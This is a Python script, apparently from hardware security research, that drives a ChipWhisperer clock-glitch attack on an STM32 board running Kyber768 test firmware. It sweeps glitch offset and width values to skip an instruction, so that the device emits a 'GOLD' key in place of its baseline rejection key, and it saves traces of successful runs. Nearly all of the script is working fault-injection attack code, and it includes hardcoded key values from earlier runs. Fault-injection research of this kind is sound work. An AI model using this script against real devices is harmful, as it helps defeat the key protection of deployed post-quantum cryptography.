#!/usr/bin/env python3
"""
Kyber768 Instruction Skip - V12 DEBUG VERSION (fixed)
Keys are confirmed different - attack should work

REPRODUCIBILITY MODE: Keys are hardcoded below for consistent runs.
Set USE_FIXED_KEYS = False to read keys dynamically from firmware.
"""

import chipwhisperer as cw
import time
import numpy as np
import os
import sys
from datetime import datetime

FW_PATH = "bin/test_glitch.hex"

# ============================================================================
# FIXED KEYS FOR REPRODUCIBILITY
# Set USE_FIXED_KEYS = True to use these hardcoded values
# Set USE_FIXED_KEYS = False to read dynamically from firmware output
# ============================================================================
USE_FIXED_KEYS = True

# These are the keys from the previous SUCCESSFUL run (KYBER_SUCCESS.txt)
FIXED_TARGET_KEY = "6771659256072f61a9e90ef845cb7309944aed68e612ac76721fd87dff2acb7b"
FIXED_BASELINE_KEY = "9520795cec4b863d712868f6a69a3e70bd551a9f44cef65af6a1357dd9eb03b2"  # Will be validated at runtime
# ============================================================================

# Golden parameters that worked before
EXT_OFFSET_RANGE = range(12, 25)    # Focus around golden=17
WIDTH_RANGE = range(2, 8)           # Around golden=4
OFFSET_RANGE = range(-18, -6)       # Around golden=-12

MAX_ATTEMPTS = 50000

def setup():
    print("="*60, flush=True)
    print("V12 DEBUG ATTACK (fixed)", flush=True)
    print("="*60, flush=True)
    
    scope = cw.scope()
    target = cw.target(scope)
    
    scope.default_setup()
    scope.clock.clkgen_freq = 7372800
    scope.clock.adc_src = "clkgen_x4"
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.trigger.triggers = "tio4"
    target.baud = 38400
    
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "enable_only"
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
    scope.glitch.repeat = 1
    
    return scope, target

def reset(scope, target):
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.1)
    target.flush()

def glitch(scope, target, target_key, baseline_key, ext, w, off):
    scope.glitch.ext_offset = ext
    scope.glitch.width = w
    scope.glitch.offset = off
    target.flush()
    
    r = ""
    t = time.time()
    while time.time() - t < 0.4:
        if target.in_waiting():
            r += target.read()
            if "WAIT" in r: break
        time.sleep(0.005)
    
    if "WAIT" not in r:
        return "timeout", None, None
    
    scope.arm()
    if scope.capture():
        return "no_trig", None, None
    
    r = ""
    t = time.time()
    while time.time() - t < 0.4:
        if target.in_waiting():
            r += target.read()
            if "KEY:" in r and "\n" in r[r.find("KEY:"):]:
                break
        time.sleep(0.005)
    
    if target_key in r:
        return "SUCCESS", scope.get_last_trace(), target_key
    elif baseline_key in r:
        return "normal", None, baseline_key
    elif "KEY:" in r:
        # Extract key for analysis
        idx = r.find("KEY:") + 4
        key = r[idx:idx+70].strip().split()[0] if len(r) > idx else "?"
        return "different", None, key
    else:
        return "crash", None, None

def main():
    scope, target = setup()
    
    print(f"Programming {FW_PATH}...", flush=True)
    cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
    print("OK", flush=True)
    
    reset(scope, target)
    time.sleep(0.5)
    
    # Read boot output
    out = ""
    t = time.time()
    while time.time() - t < 5:
        if target.in_waiting():
            out += target.read()
        time.sleep(0.02)
    
    # Extract GOLD key from firmware
    firmware_gold = None
    if "GOLD:" in out:
        idx = out.index("GOLD:") + 5
        firmware_gold = out[idx:].strip().split()[0]
    
    # Extract first KEY (baseline rejection) from firmware
    firmware_baseline = None
    if "KEY:" in out:
        idx = out.index("KEY:") + 4
        firmware_baseline = out[idx:].strip().split()[0]
    
    # Use fixed or dynamic keys based on config
    if USE_FIXED_KEYS:
        # For reproducibility, we MUST use firmware's GOLD key as target
        # (that's what a successful skip will produce)
        # But we can use fixed baseline to filter normal runs
        if not firmware_gold:
            print("ERROR: No GOLD key from firmware - required for attack!", flush=True)
            scope.dis(); return
        
        target_key = firmware_gold  # Must match firmware for success to work
        baseline_key = firmware_baseline if firmware_baseline else FIXED_BASELINE_KEY
        
        print(f"REPRODUCIBILITY MODE ENABLED", flush=True)
        print(f"TARGET KEY (from firmware): {target_key}", flush=True)
        print(f"BASELINE KEY: {baseline_key}", flush=True)
        
        # Save current keys for reference
        with open("current_keys.txt", "w") as f:
            f.write(f"GOLD={target_key}\nBASELINE={baseline_key}\nTIME={datetime.now()}\n")
        print("(Saved to current_keys.txt for reproducibility)", flush=True)
    else:
        # Dynamic mode - use firmware keys
        if not firmware_gold:
            print("ERROR: No GOLD key from firmware!", flush=True)
            scope.dis(); return
        if not firmware_baseline:
            print("ERROR: No baseline KEY from firmware!", flush=True)
            scope.dis(); return
        
        target_key = firmware_gold
        baseline_key = firmware_baseline
        print(f"TARGET KEY (GOLD):   {target_key}", flush=True)
        print(f"BASELINE KEY:        {baseline_key}", flush=True)
    
    if target_key == baseline_key:
        print("ERROR: Keys are SAME! Attack cannot work!", flush=True)
        scope.dis(); return
    
    print(f"Keys are DIFFERENT - Attack possible!", flush=True)
    print("="*60, flush=True)
    print(f"ext_offset: {EXT_OFFSET_RANGE.start}-{EXT_OFFSET_RANGE.stop-1}", flush=True)
    print(f"width: {WIDTH_RANGE.start}-{WIDTH_RANGE.stop-1}", flush=True)
    print(f"offset: {OFFSET_RANGE.start} to {OFFSET_RANGE.stop-1}", flush=True)
    print(f"Started: {datetime.now()}", flush=True)
    print("="*60, flush=True)
    
    os.makedirs("traces_repro", exist_ok=True)
    
    total = crashes = timeouts = normal = different = 0
    
    try:
        cycle = 0
        while total < MAX_ATTEMPTS:
            cycle += 1
            for ext in EXT_OFFSET_RANGE:
                for w in WIDTH_RANGE:
                    for off in OFFSET_RANGE:
                        total += 1
                        
                        res, trace, key = glitch(scope, target, target_key, baseline_key, ext, w, off)
                        
                        if res == "SUCCESS":
                            print(f"\n{'='*60}", flush=True)
                            print("*** SUCCESS! ***", flush=True)
                            print(f"ext={ext}, w={w}, off={off}", flush=True)
                            print(f"attempts={total}", flush=True)
                            print(f"{'='*60}", flush=True)
                            
                            np.save(f"traces_repro/SUCCESS_v12_e{ext}_w{w}_o{off}.npy", trace)
                            with open("KYBER_SUCCESS_V12.txt", "w") as f:
                                f.write(f"SUCCESS!\next={ext}\nwidth={w}\noffset={off}\nattempts={total}\n")
                            scope.dis(); return
                        
                        elif res == "different":
                            different += 1
                            if different <= 3:
                                print(f"[!] Different: {key[:40]}...", flush=True)
                        elif res == "normal":
                            normal += 1
                        elif res in ("crash", "no_trig"):
                            crashes += 1
                            if crashes % 25 == 0:
                                reset(scope, target)
                                time.sleep(0.1)
                        else:
                            timeouts += 1
                            if timeouts % 20 == 0:
                                reset(scope, target)
                                time.sleep(0.1)
                        
                        if total >= MAX_ATTEMPTS: break
                    if total >= MAX_ATTEMPTS: break
                if total >= MAX_ATTEMPTS: break
            
            pct = crashes / total * 100 if total > 0 else 0
            print(f"Cycle {cycle}: {total} | Crash:{crashes}({pct:.1f}%) Norm:{normal} Diff:{different} TO:{timeouts}", flush=True)
        
        print(f"\nNo success after {total}.", flush=True)
    
    except KeyboardInterrupt:
        print(f"\nStopped at {total}", flush=True)
    finally:
        scope.dis(); target.dis()

if __name__ == "__main__":
    main()
